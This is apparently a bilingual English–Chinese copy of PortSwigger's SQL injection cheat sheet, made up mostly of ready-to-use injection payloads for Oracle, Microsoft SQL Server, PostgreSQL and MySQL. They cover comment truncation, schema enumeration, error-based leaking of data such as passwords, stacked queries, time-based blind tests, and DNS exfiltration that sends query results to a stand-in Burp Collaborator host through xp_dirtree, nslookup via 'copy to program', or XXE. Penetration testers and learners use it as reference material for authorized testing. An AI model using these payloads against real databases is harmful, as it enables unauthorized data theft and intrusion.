---
description: https://portswigger.net/web-security/sql-injection/cheat-sheet
---

# 😆 cheat sheet

## [SQL injection](https://portswigger.net/web-security/sql-injection) cheat sheet

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

SQL注入备忘录包含许多有用的语法例子，当你进行SQL注入攻击时，你可以使用它们执行各种常见的任务。

### String concatenation-字符串拼接 <a href="#string-concatenation" id="string-concatenation"></a>

You can concatenate together multiple strings to make a single string.

你可以将多个字符串拼接成一个字符串。

| Oracle     | `'foo'\|\|'bar'`                                                                                                 |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `'foo'+'bar'`                                                                                                    |
| PostgreSQL | `'foo'\|\|'bar'`                                                                                                 |
| MySQL      | <p><code>'foo' 'bar'</code> [Note the space between the two strings]<br><code>CONCAT('foo','bar')</code><br></p> |

### Substring-子串 <a href="#substring" id="substring"></a>

You can extract part of a string, from a specified offset with a specified length.&#x20;

你可以从某个特定偏移处开始提取出一个字符串的特定长度的部分。

Note that the offset index is 1-based.&#x20;

注意到偏移量是从1开始的

Each of the following expressions will return the string `ba`.

下列的表达式都会返回字符串`ba`

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| ---------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

### Comments-注释 <a href="#comments" id="comments"></a>

You can use comments to truncate a query and remove the portion of the original query that follows your input.

你可以使用注释来截断查询并移除掉原始查询中你的输入后面的部分。

| Oracle     | <p><code>--comment</code><br></p>                                                                                          |
| ---------- | -------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>--comment</code><br><code>/*comment*/</code></p>                                                                  |
| PostgreSQL | <p><code>--comment</code><br><code>/*comment*/</code></p>                                                                  |
| MySQL      | <p><code>#comment</code><br><code>-- comment</code> [Note the space after the double dash]<br><code>/*comment*/</code></p> |

MySQL双破折号注释后要跟上一个空格。

### Database version-数据库版本 <a href="#database-version" id="database-version"></a>

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

| Oracle     | <p><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code><br></p> |
| ---------- | --------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT @@version`                                                                                  |
| PostgreSQL | `SELECT version()`                                                                                  |
| MySQL      | `SELECT @@version`                                                                                  |

### Database contents-数据库内容 <a href="#database-contents" id="database-contents"></a>

You can list the tables that exist in the database, and the columns that those tables contain.

你可以列出数据库中存在的表，以及这些表含有的列。

<table data-header-hidden><thead><tr><th width="139"></th><th></th></tr></thead><tbody><tr><td>Oracle</td><td><code>SELECT * FROM all_tables</code><br><code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></td></tr><tr><td>Microsoft</td><td><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></td></tr><tr><td>PostgreSQL</td><td><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></td></tr><tr><td>MySQL</td><td><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></td></tr></tbody></table>

### Conditional errors <a href="#conditional-errors" id="conditional-errors"></a>

You can test a single boolean condition and trigger a database error if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| ---------- | --------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### Extracting data via visible error messages <a href="#extracting-data-via-visible-error-messages" id="extracting-data-via-visible-error-messages"></a>

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

| Microsoft  | <p><code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code><br><br><code>> Conversion failed when converting the varchar value 'secret' to data type int.</code></p> |
| ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| PostgreSQL | <p><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code><br><br><code>> invalid input syntax for integer: "secret"</code></p>                     |
| MySQL      | <p><code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code><br><br><code>> XPATH syntax error: '\secret'</code></p>               |

### Batched (or stacked) queries <a href="#batched-or-stacked-queries" id="batched-or-stacked-queries"></a>

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

| Oracle     | `Does not support batched queries.` |
| ---------- | ----------------------------------- |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE`        |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`        |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`        |

**Note**

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

### Time delays <a href="#time-delays" id="time-delays"></a>

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

### Conditional time delays <a href="#conditional-time-delays" id="conditional-time-delays"></a>

You can test a single boolean condition and trigger a time delay if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                   |

### DNS lookup <a href="#dns-lookup" id="dns-lookup"></a>

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

<table data-header-hidden><thead><tr><th width="210.5"></th><th></th></tr></thead><tbody><tr><td>Oracle</td><td><p>(<a href="https://portswigger.net/web-security/xxe">XXE</a>) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:</p><p><code>SELECT EXTRACTVALUE(xmltype('&#x3C;?xml version="1.0" encoding="UTF-8"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual</code></p><p>The following technique works on fully patched Oracle installations, but requires elevated privileges:</p><p><code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code></p></td></tr><tr><td>Microsoft</td><td><code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</code></td></tr><tr><td>PostgreSQL</td><td><code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</code></td></tr><tr><td>MySQL</td><td><p>The following techniques work on Windows only:</p><p><code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code><br><code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></p></td></tr></tbody></table>

### DNS lookup with data exfiltration <a href="#dns-lookup-with-data-exfiltration" id="dns-lookup-with-data-exfiltration"></a>

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                                                                                                                                                                        |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                                                                                                                                                                               |
| PostgreSQL | <p><code>create OR replace function f() returns void as $$</code><br><code>declare c text;</code><br><code>declare p text;</code><br><code>begin</code><br><code>SELECT into p (SELECT YOUR-QUERY-HERE);</code><br><code>c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';</code><br><code>execute c;</code><br><code>END;</code><br><code>$$ language plpgsql security definer;</code><br><code>SELECT f();</code></p> |
| MySQL      | <p>The following technique works on Windows only:<br><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></p>                                                                                                                                                                                                                                                                                                                |
